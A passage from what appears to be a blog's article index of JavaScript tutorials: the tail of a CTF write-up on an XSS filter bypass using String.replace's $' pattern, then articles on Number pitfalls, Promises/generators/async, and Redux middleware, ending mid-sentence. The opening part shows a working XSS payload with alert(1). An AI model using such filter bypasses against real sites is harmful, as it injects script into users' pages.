$&#39; can get the back. Let’s see an example: const str = '123&#123;n&#125;456' // 123A456 console.log(str.replace('&#123;n&#125;', 'A')) // 123123A456, the original &#123;n&#125; becomes 123A console.log(str.replace('&#123;n&#125;', \"$`A\")) // 123456A456, the original &#123;n&#125; becomes 456A console.log(str.replace('&#123;n&#125;', \"$'A\")) So back to our challenge: var tmpl = '&lt;input type=\"submit\" value=\"&#123;&#123;value&#125;&#125;\">' var value = prompt('your payload') value = value.replace(/[>\"]/g, '') tmpl = tmpl.replace('&#123;&#123;value&#125;&#125;', value) document.body.innerHTML = tmpl &quot;&gt; is right after｛{value}}, although both characters are filtered out, we can use $&#39; to get these two characters. So the answer to this question is $&#39;&lt;style onload=alert(1) : var tmpl = '&lt;input type=\"submit\" value=\"&#123;&#123;value&#125;&#125;\">' var value = \"$'&lt;style onload=alert(1) \" value = value.replace(/[>\"]/g, '') tmpl = tmpl.replace('&#123;&#123;value&#125;&#125;', value) document.body.innerHTML = tmpl We can use $&#39; which is &quot;&gt; to close the tag, then we can use other tags for XSS, and the final result is: &lt;input type=\"submit\" value=\"\">&lt;style onload=alert(1) \"> I first learned about this at PlaidCTF 2022 - YACA, but a similar trick seems to have occurred at DragonCTF 2021 - Webpwn.","link":"/2022/04/14/en/javascript-magic-of-string-and-regexp/"},{"title":"Common Mistakes When Using Numbers in JavaScript","text":"Among the various data types in JavaScript, Number is a very commonly used one, and there are some small details that need to be paid special attention to, otherwise it is easy to write code with bugs. This article will show you some examples, some are hypothetical scenarios, and some are problems I have encountered myself. Before continuing to explain each case, you can try to put yourself in the scenario and think about whether you know the cause of the problem and how to avoid it. Case 1: Starting with Duplicate IDsWhen I was working at my previous company, my colleague was responsible for a system similar to a forum, and each message would have a unique ID. Since it is called an ID, it means that it cannot be duplicated. However, one day, my colleague found that the ID was duplicated! When he opened the DevTools and looked at the response content, the ID was indeed duplicated. So he went to confirm with the backend and complained about how the backend had a bug and generated duplicate IDs. However, after the backend checked it, they said that there was no such thing, and the ID could not be duplicated. Moreover, they had checked it, so was there a problem with the frontend? So my colleague went back to the frontend and found a strange phenomenon. When you look at it on the “Response” tab in the developer tools, the ID is indeed not duplicated: However, once you switch to the “Preview” tab, you will find that the ID is actually duplicated: Why is there such a magical phenomenon? Is it another wonderful bug in JavaScript? No, it’s not. It’s just that my colleague is not so familiar with the Number data type in JavaScript. Numbers with RangesIn the previous article Counting All Data Types in JavaScript, we mentioned that JavaScript numbers are stored using 64 bits and follow the IEEE 754-2019 specification. Since it is stored using 64 bits, it means that the amount of data that can be represented is limited, but numbers are infinite, so naturally, 64 bits cannot store all numbers, so there must be a limit and a safe range. In JavaScript, you can use Number.MAX_SAFE_INTEGER to get the safe range of positive integers. This value will be 2^53 - 1, which is 9007199254740991. What does this safe range mean? This paragraph from MDN explains it well: Safe in this context refers to the ability to represent integers exactly and to correctly compare them. For example, Number.MAX_SAFE_INTEGER + 1 &#x3D;&#x3D;&#x3D; Number.MAX_SAFE_INTEGER + 2 will evaluate to true, which is mathematically incorrect. Safe refers to the ability to represent integers exactly and to correctly compare them. In other words, if it exceeds this safe range, this cannot be guaranteed. An example will make it clearer: console.log(9007199254740992 === 9007199254740993) // true console.log(Number('9007199254740993')) // 9007199254740992 By now, you should know why my colleague encountered this problem. This is because the ID passed by the backend was too large. In the Response tab, it only presents the original data returned by the backend and does not convert it into a JavaScript object. In the Preview tab, the JSON-formatted string is converted into a JavaScript object, so the ID is converted into a Number, exceeding the safe range, resulting in an error, just like the example above. So how to solve this? The ID passed by the backend should be in string type, and when using it in the frontend, remember not to convert it into a number, and treat the ID as a string, so that there will be no errors caused by converting it into a number. In addition, the Number.MAX_SAFE_INTEGER mentioned above refers to the safe range, which means that even if it exceeds this range, you can still store numbers, but they are not accurate. Do these inaccurate numbers have a range? Yes, they do, and the upper limit is Number.MAX_VALUE: console.log(Number.MAX_VALUE) // 1.7976931348623157e+308 It’s about 1.79 * 10^308, a very large number. What happens if it exceeds this range? It becomes positive infinity: Infinity. console.log(Number.MAX_VALUE + 1) // 1.7976931348623157e+308 console.log(Number.MAX_VALUE * 2) // Infinity Hey, didn’t I say that if it’s larger than Number.MAX_VALUE, it will be infinite? Why didn’t it become Infinity after +1? The reason is the same as mentioned above. After exceeding the safe range, it becomes imprecise. Therefore, +1 is still the same number. If you are curious about how much to add to become Infinity, I found it out. It seems to be this number: console.log(Number.MAX_VALUE + 9.9792015476735e+291) // 1.7976931348623157e+308 console.log(Number.MAX_VALUE + 9.9792015476736e+291) // Infinity Anyway, in the future, when dealing with large number-related calculations, remember the upper limit of Number. If it exceeds this range, you can use the latest BigInt data type to handle it, and you won’t encounter these problems. Case 2: Closest Pair of PointsA few years ago, I set up a LIOJ to let students practice basic programming syntax, and there are some questions I came up with. One of the questions is not particularly difficult, and it can even be said to be quite ordinary, but only about 25% of the answers are correct. The question link is here: LIOJ 1033 - Closest Pair of Points. Interested friends can try it first to see if they can AC at once (but first familiarize themselves with the input and output mode of OJ). The question is like this. Since the input is read from a file, it will always be a string, and the format is like this: 4 2 3 1 3 1 2 1 1 The first line 4 means that there are 4 sets of data, and each subsequent line is a set of coordinates represented by (x, y). The question is to find the two closest points. If there are more than two sets that are closest, please output the one that appears first in the data. When outputting, please output the point with the smaller x first. If x is the same, please output the point with the smaller y first. Using the test data above as an example, the answer will be: 1 3 2 3 This question seems to have no difficulty. What mistakes did everyone make that they couldn’t solve? Let’s first look at a common solution: const input = `4 2 3 1 3 1 2 1 1` const lines = input.split('\\n') const dots = lines.slice(1).map(item => item.split(' ')) let min = Infinity let ans1, ans2 for(let i=0; i&lt;dots.length; i++) &#123; for(let j=i+1; j&lt;dots.length; j++) &#123; let dis = distance(dots[i][0], dots[i][1], dots[j][0], dots[j][1]) if (dis &lt; min) &#123; ans1 = dots[i] ans2 = dots[j] min = dis &#125; &#125; &#125; // 先輸出 x 比較小的點 if (ans1[0] > ans2[0]) &#123; console.log(ans2[0] + ' ' + ans2[1]) console.log(ans1[0] + ' ' + ans1[1]) &#125; else if (ans1[0] &lt; ans2[0])&#123; console.log(ans1[0] + ' ' + ans1[1]) console.log(ans2[0] + ' ' + ans2[1]) &#125; else &#123; // 兩個相等，輸出 y 較小的點 if (ans1[1] > ans2[1]) &#123; console.log(ans2[0] + ' ' + ans2[1]) console.log(ans1[0] + ' ' + ans1[1]) &#125; else &#123; console.log(ans1[0] + ' ' + ans1[1]) console.log(ans2[0] + ' ' + ans2[1]) &#125; &#125; function distance(x1, y1, x2, y2) &#123; return Math.sqrt( (x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2) ) &#125; It seems that there is no problem. Take each set to calculate the distance, find the minimum value after the distance is calculated, and output the result according to the requirements of the question. The test data provided by the question has also passed. However, if you actually submit it to OJ, you will find that it is wrong. Where is the mistake? It’s not wrong in calculating the distance, but in outputting: if (ans1[0] > ans2[0]) &#123; console.log(ans2[0] + ' ' + ans2[1]) console.log(ans1[0] + ' ' + ans1[1]) &#125; else if (ans1[0] &lt; ans2[0])&#123; console.log(ans1[0] + ' ' + ans1[1]) console.log(ans2[0] + ' ' + ans2[1]) &#125; else &#123; // 兩個相等，輸出 y 較小的點 if (ans1[1] > ans2[1]) &#123; console.log(ans2[0] + ' ' + ans2[1]) console.log(ans1[0] + ' ' + ans1[1]) &#125; else &#123; console.log(ans1[0] + ' ' + ans1[1]) console.log(ans2[0] + ' ' + ans2[1]) &#125; &#125; Assuming that the two closest points found are (11,12) and (2,3), according to the description of the question, the point with the smaller x should be output first, which is (2,3). However, the above code will output (11,12) first. Why is this? This is because we did not specifically convert the data into numbers during the data reading process, so the numbers we thought from beginning to end are actually strings. When calculating the distance, because subtraction (x1 - x2) is used, JavaScript will automatically convert it to a number and then subtract it. However, when comparing, it will still be compared according to the original data type, which is a string. JavaScript’s comparison of strings is basically based on lexicographic order. Simply put, when you look up a word in a dictionary, for example, if you want to look up cool, you must first turn to the page of c, and then start looking for co, and then look for coo. Find one word at a time, and finally find cool. The comparison of lexicographic order is also similar, comparing one word at a time, so when JavaScript compares &quot;11&quot; with 2, it compares the first word and finds that &quot;2&quot; is larger than &quot;1&quot;, so the result is &quot;2&quot; &gt; &quot;11&quot;, which is completely different from the comparison logic of numbers. Therefore, before making a comparison, please remember to check the data type of the variable. Different types will have different comparison methods. In the above code, as long as the strings are converted to numbers when reading the input, there will be no problem. Although I wrote it like this above, in a few cases, even if you pay attention to the data type, it may not work because the underlying operation is different from what you think. In JavaScript, the most famous case is the sorting of arrays. let arr = [2, 11, 3, 7, 42] arr.sort() console.log(arr) // ??? The above code, I believe anyone who reads it will think that the result is either 2,3,7,11,42 or the reverse 42,11,7,3,2, but the result is unexpected. I’m sorry, neither of them is correct. The answer is 11,2,3,42,7: let arr = [2, 11, 3, 7, 42] arr.sort() console.log(arr) // [11, 2, 3, 42, 7] This is because the default sorting method of Array.prototype.sort will first convert the elements in the array into strings for sorting. Let’s take a look at the specification (23.1.3.27.1 SortCompare, p658): Therefore, if you want to sort numbers, you must pass the parameter comparefn to customize the comparison method, such as this: let arr = [2, 11, 3, 7, 42] arr.sort((a, b) => a - b) console.log(arr) // [2, 3, 7, 11, 42] The logic of comparefn is that it will pass in two elements a and b in the array. If the function returns a negative number, it means that a is in front of b. If it returns 0, it means that the order of a and b will not change. A positive number means that b is in front of a. I remember it in another way: “Assume that the input ab is originally in the order of the array ab. Returning a positive number means that the two need to be swapped, a negative number means no swap, and 0 means the two are equal.” Therefore, if I have two numbers, 2 and 11, and I return a - b, it will be a negative number, so they will not be swapped, and they will be sorted from small to large. If I return b - a, it will be a positive number, and they will be swapped, so they will be sorted from large to small. So why did JavaScript design it this way? Someone has asked Brendan Eich on Twitter, and the link is here: https://twitter.com/BrendanEich/status/930665293034283008 His reply was: You mean the default sort function? It’s modeled on Perl 4 sort. Presumption was JS would be used for perlish tasks &amp; strings were likelier in arrays than numbers. (I think that’s the Perl rationale, but not sure.) Picking a numeric sort function if the array contained only numbers required checking every element type. I had to pick a type! I didn’t understand it very well, but the general idea should be that he referred to Perl 4’s sort when designing it, and assumed that JS would be used for Perl-related tasks by default, and strings would be more likely to appear in arrays than numbers. In addition, if you want to implement numeric sorting, you have to check the data type of each element in the array first. In any case, when using sort, you need to pay attention to this situation, and when comparing numbers, you also need to remember to check the data type first, otherwise you may write code with bugs. Finally, a small reminder is that when converting numbers to strings, the result may be slightly different from what you think. console.log((12345678912345678).toString()) // 12345678912345678 console.log((1234567891234567812345).toString()) // 1.2345678912345677e+22 console.log((0.000001).toString()) // 0.000001 console.log((0.0000001).toString()) // 1e-7 When you convert some larger or smaller numbers, they will be converted into scientific notation. There are detailed conversion rules in the specification (6.1.6.1.20 Number::toString, p.83): Case 3: Floating Point Precision IssuesThis should be well known, which is the classic 0.1 + 0.2 !== 0.3: console.log(0.1 + 0.2 === 0.3) // false console.log(0.1 + 0.2) // 0.30000000000000004 If you think this is a problem unique to JavaScript, then you are wrong. This is actually a common problem in many programming languages. The root cause of the problem is similar to the number range problem we mentioned at the beginning. The space for storing numbers is limited, but the numbers are infinite, so it is impossible to express all numbers accurately. There is another problem with floating-point numbers, which is that there may be infinitesimal numbers, such as 1/3 = 0.3333..... When stored as floating-point numbers, some precision will be lost: console.log((1/3).toFixed(30)) // 0.333333333333333314829616256247 So what should we do when writing programs? If you don’t need to do very precise calculations, but just want to avoid errors like 0.1 + 0.2 !== 0.3, usually we will choose a reasonable error value, which means that we don’t care whether they are equal or not, but consider the error. As long as the error value is within a certain range, they are considered equal. In JavaScript, for example, there is a Number.EPSILON: console.log(Math.abs(0.3 - (0.1 + 0.2))) // 5.551115123125783e-17 console.log(Math.abs(0.3 - (0.1 + 0.2)) &lt; Number.EPSILON) // true However, the value of Number.EPSILON is 2^-52, which is actually too small. If you perform floating-point arithmetic several times, it is easy to exceed this range: console.log(Math.abs(3.3 - (1.1 + 1.1 + 1.1))) // 4.440892098500626e-16 console.log(Math.abs(3.3 - (1.1 + 1.1 + 1.1)) &lt; Number.EPSILON) // false Therefore, a more practical approach is to determine the error value based on your usage scenario. For example, if the input you use for calculation is at most up to the third decimal place, such as 1.283 or 27.583, then an error value of 1e-9 should be sufficient. However, if you need higher precision calculations, do not use floating-point numbers. Using other libraries such as decimal.js would be a better choice. In the future, we may also have the opportunity to see JavaScript natively support this feature. If you want to know whether various programming languages have this problem, you can refer to this website: https://0.30000000000000004.com/. If you want to further understand the principles behind floating-point numbers and more examples, you can refer to this article I have read since I was young: The most basic concept of using floating-point numbers, and What you don’t know about C language: floating-point arithmetic. Case 4: Numbers that are not numbersHave you ever seen the word NaN on some websites? In JavaScript, when you perform some “not a number” operations on numbers, a thing called NaN will be generated: console.log(Number('abc')) // NaN console.log(500/undefined) // NaN The full name of NaN is Not a Number. However, I suggest that you do not remember it this way because it is actually more like “a special number used to represent illegal numbers”. Because the type of NaN is also Number: console.log(typeof NaN) // number And it also has a magical feature, which is the only value in the entire world of JavaScript that is not equal to itself (by the way, you can make a similar one yourself using Proxy or Object.defineProperty): console.log(NaN === NaN) // false But this behavior is not invented by JavaScript itself, but is specified in IEEE 754 mentioned earlier. If you want to know the reason, you can go to the answers under Why is NaN not equal to NaN?, and the best answer also quotes some answers from IEEE 754 members. If you want to detect whether a value is NaN in JavaScript, due to historical baggage, you have two ways: console.log(isNaN(NaN)) // true console.log(isNaN('abc')) // true console.log(Number.isNaN(NaN)) // true console.log(Number.isNaN('abc')) // false The first isNaN is a function that exists on the global object. Its specification is as follows (19.2.3 isNaN. p.468): Simply put, if the value passed in is not a number, it will be converted to a number first, and then check whether it is NaN. Therefore, the passed in &quot;abc&quot; will be converted to a number and become NaN. The second one is Number.isNaN introduced in ES6, and its specification is as follows (21.1.2.4 Number.isNaN, p.508): Here, it first checks whether the type is a number. If it is not, it directly returns false. If it is, it then checks whether it is NaN. So, if the version is too old and there is no Number.isNaN, how to implement its polyfill? We can refer to the implementation of corejs, which uses the feature of “not equal to itself”. // `Number.isNaN` method // https://tc39.es/ecma262/#sec-number.isnan $(&#123; target: 'Number', stat: true &#125;, &#123; isNaN: function isNaN(number) &#123; // eslint-disable-next-line no-self-compare -- NaN check return number != number; &#125; &#125;); ConclusionWhen using numbers, the two most common mistakes are probably not paying attention to the range and type. As long as you remember that numbers have a range of storage, you can avoid writing similar bugs in the future. When dealing with floating-point numbers and large numbers, you should also be more careful and remind yourself not to exceed the range. As for types, confusing strings and numbers can lead to unexpected results when adding or comparing. These are also parts that you should pay attention to. If you are really confused by types, you can also consider introducing TypeScript or similar tools, which will remind you of type problems during compilation. As for the problem with Array.prototype.sort, probably every novice will step on it once, after all, it is really counterintuitive. Finally, this article only mentions some relatively superficial parts, and does not involve more knowledge related to Number, such as 0 actually has +0 and -0, and infinity is also divided into positive infinity and negative infinity. It also does not explain the underlying principles, such as: How is Number.MAX_SAFE_INTEGER calculated? Where does Number.MAX_VALUE come from? What is the detailed principle of floating-point error? How is it stored in the system? To explain these, we need to look at IEEE 754. Some of them I don’t understand very well myself, and I will introduce them to you in the future if I have the opportunity.","link":"/2022/03/14/en/javascript-number/"},{"title":"[Javascript] Promise, generator, async and ES6","text":"In JavaScript, there is a super important concept called asynchronous, which is also the easiest concept to confuse and forget when you first start learning. ES6 natively supports Promise, which works better with Generator, and ES7 even supports the syntax of async. I think this is an evolutionary process that makes the program architecture better and more readable. So to explain these new things, let’s start with the most basic callback. Now let’s assume we have three APIs. The first is an API that fetches a list of articles. [ &#123; \"title\": \"Article 1\", \"id\": 1 &#125;, &#123; \"title\": \"Article 2\", \"id\": 2 &#125;, &#123; \"title\": \"Article 3\", \"id\": 3 &#125; ] The second is an API that fetches the content of an article given its ID. &#123; \"authorId\": 5, \"content\": \"content\", \"timestamp\": \"2015-08-26\" &#125; The third is an API that returns author information given an author ID. &#123; \"email\": \"aszx87410@gmail.com\", \"name\": \"huli\", \"id\": 5 &#125; Now the functionality we want to achieve is: fetch the email of the author of the latest article. The process is: fetch the article list -&gt; fetch the article information -&gt; fetch the author. The code implementation looks like this. getArticleList(function(articles)&#123; getArticle(articles[0].id, function(article)&#123; getAuthor(article.authorId, function(author)&#123; alert(author.email); &#125;) &#125;) &#125;) function getAuthor(id, callback)&#123; $.ajax(\"http://beta.json-generator.com/api/json/get/E105pDLh\",&#123; author: id &#125;).done(function(result)&#123; callback(result); &#125;) &#125; function getArticle(id, callback)&#123; $.ajax(\"http://beta.json-generator.com/api/json/get/EkI02vUn\",&#123; id: id &#125;).done(function(result)&#123; callback(result); &#125;) &#125; function getArticleList(callback)&#123; $.ajax( \"http://beta.json-generator.com/api/json/get/Ey8JqwIh\") .done(function(result)&#123; callback(result); &#125;); &#125; Or refer to the online example: Implemented with callback I believe that this code should not be unfamiliar to everyone, but there is a disadvantage to this approach, which is what we commonly call callback hell. It’s a bit ugly to have layer upon layer like this. So what should we do? There is something called Promise, which appears like this. Let’s have a practical example first and then explain it! getArticleList().then(function(articles)&#123; return getArticle(articles[0].id); &#125;).then(function(article)&#123; return getAuthor(article.authorId); &#125;).then(function(author)&#123; alert(author.email); &#125;); function getAuthor(id)&#123; return new Promise(function(resolve, reject)&#123; $.ajax(\"http://beta.json-generator.com/api/json/get/E105pDLh\",&#123; author: id &#125;).done(function(result)&#123; resolve(result); &#125;) &#125;); &#125; function getArticle(id)&#123; return new Promise(function(resolve, reject)&#123; $.ajax(\"http://beta.json-generator.com/api/json/get/EkI02vUn\",&#123; id: id &#125;).done(function(result)&#123; resolve(result); &#125;) &#125;); &#125; function getArticleList()&#123; return new Promise(function(resolve, reject)&#123; $.ajax( \"http://beta.json-generator.com/api/json/get/Ey8JqwIh\") .done(function(result)&#123; resolve(result); &#125;); &#125;); &#125; Online example: Implemented with PromisePromise is an object with three states: pending, fulfilled, and rejected. In the above example, we removed the callback function of those three functions and replaced it with returning a Promise object. The place where the callback should have appeared originally became resolve. What are the benefits of doing this? Look at the place where we call these functions at the top. The original callback hell is gone, and we flattened it. If you don’t understand it very well, let’s start with the most basic, calling a Promise. getArticleList().then(function(articles)&#123; console.log(articles); &#125;); function getArticleList()&#123; return new Promise(function(resolve, reject)&#123; $.ajax( \"http://beta.json-generator.com/api/json/get/Ey8JqwIh\") .done(function(result)&#123; resolve(result); &#125;); &#125;); &#125; You can add .then after a Promise object to get the result after the Promise is executed. If you return another Promise object in then, you can keep chaining them. For example: getArticleList().then(function(articles)&#123; return getArticle(articles[0].id); &#125;).then(function(article)&#123; return getAuthor(article); &#125;); With this feature of Promise, you can avoid callback hell. If we add ES6 arrow functions, it can be simplified to: getArticleList() .then(articles => getArticle(articles[0].id)) .then(article => getAuthor(article.authorId)) .then(author => &#123; alert(author.email); &#125;); Online example of Promise+arrow function The example of using Promise alone ends here. The syntax is already quite simple, and with arrow functions, it becomes more readable. However, seeing a bunch of then can still be a bit annoying. What’s next? ES6 has a new feature called Generator. If you don’t know what it is, you can refer to my previous article [Javascript] ES6 Generator Basics. Then we can use the feature of Generator to write code that looks super synchronous but is actually asynchronous: function* run()&#123; var articles = yield getArticleList(); var article = yield getArticle(articles[0].id); var author = yield getAuthor(article.authorId); alert(author.email); &#125; var gen = run(); gen.next().value.then(function(r1)&#123; gen.next(r1).value.then(function(r2)&#123; gen.next(r2).value.then(function(r3)&#123; gen.next(r3); console.log(\"done\"); &#125;) &#125;) &#125;); Complete online example of Promise + Generator Looking closely at the run generator, using the feature of yield, the right-hand code will be executed first, waiting for the next call and assigning it to the left-hand side. So we can call gen.next(r1) in the then event of getArticleList(), which will pass the return value to the articles variable. If you find this a bit difficult to understand, you can start with a single layer: function* run()&#123; var articles = yield getArticleList(); console.log(articles); &#125; var gen = run(); // The first call will execute getArticleList(), which will return a Promise gen.next().value.then(function(r1)&#123; // After the first Promise is completed, pass r1 back to the generator to let articles = the return value of getArticleList() gen.next(r1); console.log('done'); &#125;); Let’s take another look at the top half of the above code: function* run()&#123; var articles = yield getArticleList(); var article = yield getArticle(articles[0].id); var author = yield getAuthor(article.authorId); alert(author.email); &#125; Do you feel that it looks very similar to synchronous code? If you remove yield, it is exactly the same! This is the essence of Generator: using syntax that looks very similar to synchronous code, but is actually asynchronous. Let’s take a look at the second half: var gen = run(); gen.next().value.then(function(r1)&#123; gen.next(r1).value.then(function(r2)&#123; gen.next(r2).value.then(function(r3)&#123; gen.next(r3); console.log(\"done\"); &#125;) &#125;) &#125;); It is easy to see that the syntax of the second half is very fixed and easy to find patterns. It is also a recursion. Therefore, it can be wrapped in a function to handle more general cases. function* run()&#123; var articles = yield getArticleList(); var article = yield getArticle(articles[0].id); var author = yield getAuthor(article.authorId); alert(author.email); &#125; function runGenerator()&#123; var gen = run(); function go(result)&#123; if(result.done) return; result.value.then(function(r)&#123; go(gen.next(r)); &#125;); &#125; go(gen.next()); &#125; runGenerator(); Complete online example Promise + Generator + Recursion The co module made by tj is doing almost the same thing, but it does more. The principle is similar to what we wrote above, which is to wrap a generator and write an automatic executor. Finally, let’s talk about the last thing in the title: async. What is it? Let’s take a look at the code: async function run()&#123; var articles = await getArticleList(); var article = await getArticle(articles[0].id); var author = await getAuthor(article.authorId); alert(author.email); &#125; Complete online example async (cannot run) The difference between this code and the previous one is that: function* gen() becomes async function run() yield becomes await That’s it. And you will find that it ends like this. You don’t need to use other modules or write your own recursive executor. This is the syntax of async, which is just to write those automatic executors, but this syntax makes it much more convenient for us. Actually, this syntax is planned to be introduced in ES7, QQ. The good news is that the ES6 code we wrote above has been converted to ES5 syntax through the babel library. And it has an experimental feature, which includes async. And async is in stage 2, NOTE: Stage 2 and above are enabled by default. You don’t need to adjust any parameters to automatically enable it, which is really gratifying. When I first came into contact with ES6, I was overwhelmed by a lot of dazzling things. Each one is a subject to delve into. And I used pure callbacks before (because the level is not much, so it’s okay), and occasionally used async (node’s library, different from the one above). So I think the best way to understand it is to start with the most basic callback, gradually progress to promise, then to generator, and finally to async. Only then can we understand why these things appear. If there are any mistakes in the above, please leave a message or send me an email. Thank you. Ref:ECMAScript 6 入门 异步操作JavaScript Promises拥抱Generator，告别异步回调深入浅出ES6（三）：生成器 Generators","link":"/2015/08/26/en/javascript-promise-generator-async-es6/"},{"title":"[Javascript] Detailed Explanation of Redux Middleware","text":"Previously, I wrote an article to briefly summarize my experience in learning Redux. I still recommend the official documentation because it is super clear. However, when I was reading the official documentation before, I didn’t fully understand the middleware part and got confused towards the end. This time, I re-read the official documentation on middleware and asynchronous operations, took notes while reading, and finally understood the implementation principle of middleware. As usual, I will share my experience.Official documentation (Chinese version, but this article has not been translated yet) The great thing about the official documentation is that it not only teaches you how to use it, but also starts from scratch, so you know why middleware is in its current form. #Main ContentAfter reading some tutorial articles, you think Redux is really great, so you start using Redux for your own product. But at this moment, you suddenly want to implement a feature: logging. You want to record every action and the changes to the store after executing the action. How to do it? Let’s start with the simplest method! ##First Attempt: Most Intuitive MethodAssuming that the code for dispatching actions is originally written like this: store.dispatch(addTodo('Use Redux')); We can directly change it to: let action = addTodo('Use Redux'); console.log('dispatching', action); store.dispatch(action); console.log('next state', store.getState()); ##Second Attempt: Wrap it in a FunctionBut everyone knows that the first method cannot be done like this because there must be more than one place in the program that needs to do this. So what should we do next? Wrap it in a function. function dispatchAndLog(store, action) &#123; console.log('dispatching', action); store.dispatch(action); console.log('next state', store.getState()); &#125; dispatchAndLog(store, addTodo('Use Redux')); However, in this way, you need to import this function every time you need to dispatch, is there a better way? ##Third Attempt: MonkeypatchingWhat is Monkeypatch? You can Google it yourself. The idea is to replace something at runtime. Just like you can write in your chrome devtool: console.log = function(text)&#123; alert(text); &#125; All messages that were originally displayed in the console will now be displayed using alert. How can we use it here? //First, save the original because it will be used later let next = store.dispatch; //Override the current one store.dispatch = function dispatchAndLog(action) &#123; console.log('dispatching', action); //Execute next(action); console.log('next state', store.getState()); return; &#125;; //The way to call it is the same as before store.dispatch(addTodo('Use Redux')); In this way, the original code does not need to be modified at all. You just need to replace store.dispatch at the beginning of the program. It is easy and fun, but we soon encountered a new problem. If I want an error reporting mechanism now, what should I do? When dispatching an error, I want to pass the error back to the server. Hmm… Good question. We can separate these two tasks into two functions, like this: function patchStoreToAddLogging(store) &#123; let next = store.dispatch; store.dispatch = function dispatchAndLog(action) &#123; console.log('dispatching', action); next(action); console.log('next state', store.getState()); return; &#125;; &#125; function patchStoreToAddCrashReporting(store) &#123; let next = store.dispatch; store.dispatch = function dispatchAndReportErrors(action) &#123; try &#123; next(action); &#125; catch (err) &#123; console.error('Caught an exception!', err); Raven.captureException(err, &#123; extra: &#123; action, state: store.getState() &#125; &#125;); throw err; &#125; &#125;; &#125; patchStoreToAddLogging(store); patchStoreToAddCrashReporting(store); When I first read this, I was a bit confused about how this works. Won’t the second function overwrite the first one? But after reading it a few times, I finally understood the essence of it, which lies in the let next = store.dispatch; line. The behavior of the above code is roughly as follows: Execute the first function patchStoreToAddLogging(store); The current dispatch function (the function that actually sends the action in Redux) is saved. store.dispatch is replaced with dispatchAndLog, which records and calls the original dispatch function. Execute the second function patchStoreToAddCrashReporting(store); The current dispatch function (which is now dispatchAndLog) is saved. store.dispatch is replaced with dispatchAndReportErrors, which records and calls the original dispatch function. Now, if we call dispatch(..), here’s what happens: Because it was replaced earlier, dispatchAndReportErrors is executed. next(action) is executed, and next is the original dispatch function that was saved earlier. dispatchAndLog is executed. The action is recorded, and then next(action) is executed, and next is the original dispatch function. The original dispatch function is executed, and after it’s done, it jumps back to the dispatchAndLog function. It goes back to dispatchAndLog, prints out the changed state. It goes back to patchStoreToAddCrashReporting, but since there are no errors, nothing happens. It ends. This way, we achieve the most important function of our middleware, which is to let the action go through layer after layer of middleware and finally reach the store. But this is still not good enough. Fourth attempt: Hide MonkeypatchingPreviously, we directly replaced store.dispatch. What if we don’t replace it directly, but instead return a function? What will happen? function logger(store) &#123; let next = store.dispatch; // Previously: // store.dispatch = function dispatchAndLog(action) &#123; return function dispatchAndLog(action) &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result; &#125;; &#125; Suppose we change our crashReporter to this form as well. Then we can do this: store.dispatcher = logger(store); store.dispatcher = crashReporter(store); We’re just extracting store.dispatcher and putting it outside the function. But the advantage of doing this is that we can do this: function applyMiddlewareByMonkeypatching(store, middlewares) // Transform dispatch function with each middleware. middlewares.forEach(middleware => store.dispatch = middleware(store) ); &#125; applyMiddlewareByMonkeypatching(store, [logger, crashReporter]); But this is still just extracting the monkeypatching part. In the next step, we need to completely remove the monkeypatching method. Fifth Attempt: Removing MonkeypatchingWhy do we need to override dispatch? One important factor is that this is the only way to continuously call the previous dispatch. function logger(store) &#123; // This line is crucial to achieve chaining let next = store.dispatch; return function dispatchAndLog(action) &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result; &#125;; &#125; Without that important line, we cannot achieve the chaining effect. However, there is another way to achieve the same result. We can receive a next parameter to achieve the same effect. The official documentation then quickly explains the most important part. Here, I will try to slow down the progress and explain more details, which is the concept of currying. Continuing from what we just talked about, we can receive a next parameter, which will look like this: function logger(store, next) &#123; return function dispatchAndLog(action) &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result; &#125;; &#125; As you can see, it looks very similar to the previous one, except that the original next is now passed in as a parameter. When we use it, it becomes: let dispatch = store.dispatch; dispatch = crashReporter(store, dispatch); dispatch = logger(store, dispatch); dispatch(addTodo('Use Redux')); function logger(store, next) &#123; return function dispatchAndLog(action) &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result; &#125;; &#125; function crashReport(store, next) &#123; return function dispatchAndReportErrors(action) &#123; try &#123; return next(action); &#125; catch (err) &#123; console.error('Caught an exception!', err); throw err; &#125; &#125;; &#125; The difference is that the let next = store.dispatch; inside the function is removed. Our middleware functions logger and crashReport are now cleaner. After changing it, we also need to change our original applyMiddleware to make it conform to the new format: function applyMiddleware(store, middlewares) &#123; let dispatch = store.dispatch; middlewares.forEach(middleware => dispatch = middleware(store,dispatch) ); return Object.assign(&#123;&#125;, store, &#123; dispatch &#125;); &#125; // The way to call it is exactly the same, except that this function now returns a store applyMiddleware(store, [logger, crashReporter]); Next, let’s look at the official documentation and examples and see where they differ from what we just wrote. The first point is that we pass two parameters to logger and crashReport, but the official implementation only passes one. This is done using a technique called currying. What is currying? It is the process of breaking down a function with multiple parameters into many functions with only one parameter. You can understand it better by looking at the example: function max(a,b)&#123; return a>b?a:b; &#125; max(1,5); function maxCurrying(a)&#123; return function inner(b)&#123; return a>b?a:b; &#125; &#125; maxCurrying(1)(5); With this basic concept, we can also make the same changes to our logger function: // It can be compared with the original, and it is only one more layer of function wrapping function logger(store) &#123; return function wrapDispatchToAddLogging(next) &#123; return function dispatchAndLog(action) &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result; &#125;; &#125; &#125; // ES6 syntax const logger = store => next => action => &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result; &#125;; // Original function logger(store, next) &#123; return function dispatchAndLog(action) &#123; console.log('dispatching', action); let result = next(action); console.log('next state', store.getState()); return result; &#125;; &#125; When I first looked at the official documentation, the most confusing part for me was this section. Because I rarely used this kind of function that returns a function that returns a function, I was immediately confused. So I had to find a way to reduce the number of nested functions first, and then understand currying before going back to understand the original code. For me, this way is easier, otherwise it would be too overwhelming. applyMiddleware can be changed to this: function applyMiddleware(store, middlewares) &#123; let dispatch = store.dispatch; middlewares.forEach(middleware => dispatch = middleware(store)(dispatch) // the difference is here ); return Object.assign(&#123;&#125;, store, &#123; dispatch &#125;); &#125; // original function applyMiddleware(store, middlewares) &#123; let dispatch = store.dispatch; middlewares.forEach(middleware => dispatch = middleware(store,dispatch) // the difference is here ); return Object.assign(&#123;&#125;, store, &#123; dispatch &#125;); &#125; In fact, at this point, it is 